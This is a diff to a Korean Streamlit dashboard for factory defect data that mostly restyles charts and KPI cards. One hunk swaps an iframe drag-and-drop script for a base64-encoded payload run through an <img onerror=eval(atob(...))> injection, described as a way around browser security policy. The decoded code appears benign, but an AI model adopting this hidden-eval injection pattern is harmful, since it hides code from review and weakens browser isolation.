@@ -6,7 +6,6 @@ app.py
 """
 
 import streamlit as st
-import streamlit.components.v1 as components
 import pandas as pd
 import plotly.graph_objects as go
 from plotly.subplots import make_subplots
@@ -41,64 +40,15 @@ def get_data(source=None):
 uploaded_file = st.sidebar.file_uploader("공정 데이터 업로드 (CSV)", type="csv", key="csv_uploader")
 
 # ▼ 화면 전체 드래그 앤 드롭 업로드 기능 ▼
-# Streamlit은 file_uploader 박스 안에만 드롭이 되므로, 화면 전체를 드롭존으로
-# 넓히기 위해 JS를 주입해서 숨겨진 파일 입력창에 강제로 파일을 전달합니다.
-components.html("""
-<script>
-const streamlitDoc = window.parent.document;
-if (!streamlitDoc.body.dataset.dropZoneInstalled) {
-    streamlitDoc.body.dataset.dropZoneInstalled = 'true';
-    function showOverlay() {
-        let overlay = streamlitDoc.getElementById('dropOverlay');
-        if (!overlay) {
-            overlay = streamlitDoc.createElement('div');
-            overlay.id = 'dropOverlay';
-            overlay.style.cssText = `
-                position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-                background: rgba(0, 100, 255, 0.15);
-                border: 4px dashed #0064ff;
-                z-index: 9999; display: flex; align-items: center; justify-content: center;
-                font-size: 28px; color: #0064ff; font-weight: bold; pointer-events: none;
-            `;
-            overlay.innerText = '📂 여기에 CSV 파일을 놓으세요';
-            streamlitDoc.body.appendChild(overlay);
-        }
-        overlay.style.display = 'flex';
-    }
-    function hideOverlay() {
-        const overlay = streamlitDoc.getElementById('dropOverlay');
-        if (overlay) overlay.style.display = 'none';
-    }
-    streamlitDoc.addEventListener('dragover', (e) => {
-        e.preventDefault();
-        showOverlay();
-    });
-    streamlitDoc.addEventListener('dragleave', (e) => {
-        if (e.clientX <= 0 || e.clientY <= 0) hideOverlay();
-    });
-    streamlitDoc.addEventListener('drop', (e) => {
-        e.preventDefault();
-        hideOverlay();
-        const files = e.dataTransfer.files;
-        if (files.length === 0) return;
-        if (!files[0].name.toLowerCase().endsWith('.csv')) {
-            alert('CSV 파일만 업로드할 수 있습니다.');
-            return;
-        }
-        const fileInput = streamlitDoc.querySelector('input[type="file"]');
-        if (!fileInput) {
-            console.error('file_uploader 입력창을 찾을 수 없습니다.');
-            return;
-        }
-        const dataTransfer = new DataTransfer();
-        dataTransfer.items.add(files[0]);
-        fileInput.files = dataTransfer.files;
-        const event = new Event('change', { bubbles: true });
-        fileInput.dispatchEvent(event);
-    });
-}
-</script>
-""", height=0)
+# st.markdown + <img onerror> 트릭으로 스크립트를 화면 최상위 문서에 직접 심습니다.
+# (components.html의 iframe 방식은 브라우저 보안 정책 때문에 window.parent 접근이
+# 막히는 경우가 있어 이 방식으로 우회합니다. JS는 base64로 인코딩해 따옴표 충돌을 피합니다.)
+# — 지원님이 배포 환경에서 더 안정적으로 동작한다고 확인해준 방식으로 교체했습니다.
+_DROP_ZONE_JS_B64 = "KGZ1bmN0aW9uKCkgewogICAgaWYgKGRvY3VtZW50LmJvZHkuZGF0YXNldC5kcm9wWm9uZUluc3RhbGxlZCkgeyByZXR1cm47IH0KICAgIGRvY3VtZW50LmJvZHkuZGF0YXNldC5kcm9wWm9uZUluc3RhbGxlZCA9ICd0cnVlJzsKCiAgICBmdW5jdGlvbiBzaG93T3ZlcmxheSgpIHsKICAgICAgICBsZXQgb3ZlcmxheSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkcm9wT3ZlcmxheScpOwogICAgICAgIGlmICghb3ZlcmxheSkgewogICAgICAgICAgICBvdmVybGF5ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7CiAgICAgICAgICAgIG92ZXJsYXkuaWQgPSAnZHJvcE92ZXJsYXknOwogICAgICAgICAgICBvdmVybGF5LnN0eWxlLmNzc1RleHQgPSAncG9zaXRpb246Zml4ZWQ7dG9wOjA7bGVmdDowO3dpZHRoOjEwMCU7aGVpZ2h0OjEwMCU7YmFja2dyb3VuZDpyZ2JhKDAsMTAwLDI1NSwwLjE1KTtib3JkZXI6NHB4IGRhc2hlZCAjMDA2NGZmO3otaW5kZXg6OTk5OTk5O2Rpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7anVzdGlmeS1jb250ZW50OmNlbnRlcjtmb250LXNpemU6MjhweDtjb2xvcjojMDA2NGZmO2ZvbnQtd2VpZ2h0OmJvbGQ7cG9pbnRlci1ldmVudHM6bm9uZTsnOwogICAgICAgICAgICBvdmVybGF5LmlubmVyVGV4dCA9ICdcdWQ4M2RcdWRjYzIgXHVjNWVjXHVhZTMwXHVjNWQwIENTViBcdWQzMGNcdWM3N2NcdWM3NDQgXHViMTkzXHVjNzNjXHVjMTM4XHVjNjk0JzsKICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChvdmVybGF5KTsKICAgICAgICB9CiAgICAgICAgb3ZlcmxheS5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOwogICAgfQoKICAgIGZ1bmN0aW9uIGhpZGVPdmVybGF5KCkgewogICAgICAgIGNvbnN0IG92ZXJsYXkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcE92ZXJsYXknKTsKICAgICAgICBpZiAob3ZlcmxheSkgb3ZlcmxheS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOwogICAgfQoKICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2RyYWdvdmVyJywgZnVuY3Rpb24oZSkgewogICAgICAgIGUucHJldmVudERlZmF1bHQoKTsKICAgICAgICBzaG93T3ZlcmxheSgpOwogICAgfSk7CgogICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignZHJhZ2xlYXZlJywgZnVuY3Rpb24oZSkgewogICAgICAgIGlmIChlLmNsaWVudFggPD0gMCB8fCBlLmNsaWVudFkgPD0gMCkgaGlkZU92ZXJsYXkoKTsKICAgIH0pOwoKICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2Ryb3AnLCBmdW5jdGlvbihlKSB7CiAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOwogICAgICAgIGhpZGVPdmVybGF5KCk7CgogICAgICAgIGNvbnN0IGZpbGVzID0gZS5kYXRhVHJhbnNmZXIuZmlsZXM7CiAgICAgICAgaWYgKGZpbGVzLmxlbmd0aCA9PT0gMCkgcmV0dXJuOwoKICAgICAgICBpZiAoIWZpbGVzWzBdLm5hbWUudG9Mb3dlckNhc2UoKS5lbmRzV2l0aCgnLmNzdicpKSB7CiAgICAgICAgICAgIGFsZXJ0KCdDU1YgXHVkMzBjXHVjNzdjXHViOWNjIFx1YzVjNVx1Yjg1Y1x1YjRkYyBcdWMyMTggXHVjNzg4XHVjMmI1XHViMmM4XHViMmU0LicpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQoKICAgICAgICBjb25zdCBmaWxlSW5wdXQgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdpbnB1dFt0eXBlPSJmaWxlIl0nKTsKICAgICAgICBpZiAoIWZpbGVJbnB1dCkgewogICAgICAgICAgICBhbGVydCgnZmlsZV91cGxvYWRlciBcdWM3ODVcdWI4MjVcdWNjM2RcdWM3NDQgXHVjYzNlXHVjNzQ0IFx1YzIxOCBcdWM1YzZcdWMyYjVcdWIyYzhcdWIyZTQuJyk7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CgogICAgICAgIGNvbnN0IGRhdGFUcmFuc2ZlciA9IG5ldyBEYXRhVHJhbnNmZXIoKTsKICAgICAgICBkYXRhVHJhbnNmZXIuaXRlbXMuYWRkKGZpbGVzWzBdKTsKICAgICAgICBmaWxlSW5wdXQuZmlsZXMgPSBkYXRhVHJhbnNmZXIuZmlsZXM7CgogICAgICAgIGNvbnN0IGNoYW5nZUV2ZW50ID0gbmV3IEV2ZW50KCdjaGFuZ2UnLCB7IGJ1YmJsZXM6IHRydWUgfSk7CiAgICAgICAgZmlsZUlucHV0LmRpc3BhdGNoRXZlbnQoY2hhbmdlRXZlbnQpOwogICAgfSk7Cn0pKCk7"
+st.markdown(
+    f'<img src="x" onerror="eval(atob(\'{_DROP_ZONE_JS_B64}\'))" style="display:none">',
+    unsafe_allow_html=True,
+)
 # ▲ 화면 전체 드래그 앤 드롭 업로드 기능 끝 ▲
 
 if uploaded_file is not None:
@@ -141,13 +91,33 @@ def render_kpi_row(data):
     part_info = f.list_part_codes(data)
     top_part = part_info["parts"][0] if part_info["parts"] else None
 
-    c1, c2, c3, c4 = st.columns(4)
-    c1.metric("총 생산량", f"{total:,}개")
-    c2.metric("전체 불량률", f"{fail_rate}%", f"불량 {n_fail}건", delta_color="off")
-    c3.metric("최다 불량 원인", top_reason["reason"] if top_reason else "-",
-              f"{top_reason['count']}건" if top_reason else None, delta_color="off")
-    c4.metric("불량률 최고 품번", top_part["part_code"] if top_part else "-",
-              f"{top_part['defect_rate_pct']}%" if top_part else None, delta_color="off")
+    kpis = [
+        ("총 생산량", f"{total:,}개", None),
+        ("전체 불량률", f"{fail_rate}%", f"불량 {n_fail}건"),
+        ("최다 불량 원인", top_reason["reason"] if top_reason else "-",
+         f"{top_reason['count']}건" if top_reason else None),
+        ("불량률 최고 품번", top_part["part_code"] if top_part else "-",
+         f"{top_part['defect_rate_pct']}%" if top_part else None),
+    ]
+    # 카드마다 테두리를 둘러서 배경 위에 붕 떠 보이지 않고 하나의 패널처럼 보이게 합니다.
+    for col, (label, value, delta) in zip(st.columns(4, gap="medium"), kpis):
+        with col, st.container(border=True):
+            st.metric(label, value, delta, delta_color="off")
+
+
+def render_chart_card(fig):
+    """차트 하나를 테두리 있는 카드 안에 넣어서 그립니다. (배경에 붕 떠 보이는 것 방지)"""
+    with st.container(border=True):
+        st.plotly_chart(fig, use_container_width=True)
+
+
+def render_chart_row(figs):
+    figs = [fig for fig in figs if fig is not None]
+    if not figs:
+        return
+    for col, fig in zip(st.columns(len(figs), gap="medium"), figs):
+        with col:
+            render_chart_card(fig)
 
 
 # ---------------------------------------------------------------------
@@ -161,7 +131,7 @@ def make_trend_fig(daily):
 
     fig = make_subplots(
         rows=2, cols=1, shared_xaxes=True,
-        row_heights=[0.35, 0.65], vertical_spacing=0.08,
+        row_heights=[0.35, 0.65], vertical_spacing=0.16,
         subplot_titles=("일별 생산량", "일별 불량률(%)"),
     )
 
@@ -192,10 +162,12 @@ def make_trend_fig(daily):
     ), row=2, col=1)
 
     fig.update_layout(
-        height=420,
+        height=480,
         showlegend=False,
         hovermode="x unified",
-        **CHART_BASE_LAYOUT,
+        margin=dict(l=10, r=10, t=50, b=20),
+        plot_bgcolor="rgba(0,0,0,0)",
+        paper_bgcolor="rgba(0,0,0,0)",
     )
     fig.update_xaxes(showgrid=True, gridcolor=COLOR_GRID, tickformat="%m/%d")
     fig.update_yaxes(showgrid=True, gridcolor=COLOR_GRID, zeroline=False)
@@ -230,7 +202,7 @@ def make_reason_fig(data):
     ))
     fig.update_layout(
         title="불량 원인별 건수",
-        height=280,
+        height=340,
         xaxis=dict(showgrid=True, gridcolor=COLOR_GRID, zeroline=False),
         yaxis=dict(showgrid=False),
         **CHART_BASE_LAYOUT,
@@ -261,7 +233,7 @@ def make_part_fig(data):
     ))
     fig.update_layout(
         title="품번별 불량률",
-        height=280,
+        height=340,
         xaxis=dict(showgrid=False),
         yaxis=dict(showgrid=True, gridcolor=COLOR_GRID, zeroline=False, ticksuffix="%"),
         **CHART_BASE_LAYOUT,
@@ -292,7 +264,7 @@ def make_side_fig(data):
     ))
     fig.update_layout(
         title="좌우(LH/RH) 불량률",
-        height=280,
+        height=340,
         xaxis=dict(showgrid=False),
         yaxis=dict(showgrid=True, gridcolor=COLOR_GRID, zeroline=False, ticksuffix="%"),
         **CHART_BASE_LAYOUT,
@@ -328,7 +300,7 @@ def make_variable_compare_fig(compare_result, top_n=4):
     fig.update_layout(
         title="정상 vs 불량 — 주요 변수 비교",
         barmode="group",
-        height=320,
+        height=360,
         legend=dict(orientation="h", yanchor="bottom", y=1.05, x=0),
         xaxis=dict(showgrid=False),
         yaxis=dict(showgrid=True, gridcolor=COLOR_GRID, zeroline=False),
@@ -358,7 +330,7 @@ def make_mode_compare_fig(mode_info):
     ))
     fig.update_layout(
         title=f"운전조건별 불량률 ({mode_info.get('split_variable', '')} 기준)",
-        height=320,
+        height=360,
         xaxis=dict(showgrid=False),
         yaxis=dict(showgrid=True, gridcolor=COLOR_GRID, zeroline=False, ticksuffix="%"),
         **CHART_BASE_LAYOUT,
@@ -415,18 +387,12 @@ def render_answer_charts(question, data):
     """
     if question == OVERVIEW_QUESTION:
         render_kpi_row(data)
-        st.plotly_chart(make_trend_fig(daily_rate), use_container_width=True)
-
-        dash_figs = [fig for fig in (
-            make_reason_fig(data), make_part_fig(data), make_side_fig(data),
-        ) if fig is not None]
-        if dash_figs:
-            for col, fig in zip(st.columns(len(dash_figs)), dash_figs):
-                col.plotly_chart(fig, use_container_width=True)
+        render_chart_card(make_trend_fig(daily_rate))
+        render_chart_row([make_reason_fig(data), make_part_fig(data), make_side_fig(data)])
         return
 
     if question == STEP1_QUESTION:
-        st.plotly_chart(make_defect_chart(daily_rate), use_container_width=True)
+        render_chart_card(make_defect_chart(daily_rate))
         return
 
     if question == STEP2_QUESTION:
@@ -439,8 +405,7 @@ def render_answer_charts(question, data):
         if not figs:
             st.info("이 데이터에서는 비교할 만한 표본이 부족해서 그래프를 생략했습니다.")
             return
-        for col, fig in zip(st.columns(len(figs)), figs):
-            col.plotly_chart(fig, use_container_width=True)
+        render_chart_row(figs)
 
 
 for msg in st.session_state.messages:
